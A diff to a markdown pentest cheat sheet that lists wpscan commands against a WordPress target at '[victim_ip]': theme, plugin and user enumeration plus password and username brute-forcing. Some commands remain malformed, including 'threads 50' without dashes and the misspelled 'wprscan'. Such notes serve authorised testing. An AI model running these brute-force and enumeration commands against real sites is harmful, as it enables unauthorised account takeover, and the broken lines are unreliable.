@@ -10,11 +10,11 @@
 #### Vulnerable Themes
 - wpscan --url http://[victim_ip] --enumerate vt
 #### Enumerate Users
-- wpscan -url http://[victim_ip] --enumerate u
+- wpscan --url http://[victim_ip] --enumerate u
 #### Password Bruteforce
-- wpscan -url http://[victim_ip] -P wordlist.txt threads 50
+- wpscan --url http://[victim_ip] --passwords wordlist.txt --usernames xyz threads 50
 #### Username Bruteforce
-- wprscan -url http://[victim_ip] -U wordlist.txt 
+- wprscan --url http://[victim_ip] -U wordlist.txt 
 #### All Plugins
 - wpscan --url http://[victim_ip] --enumerate p
 #### All Themes
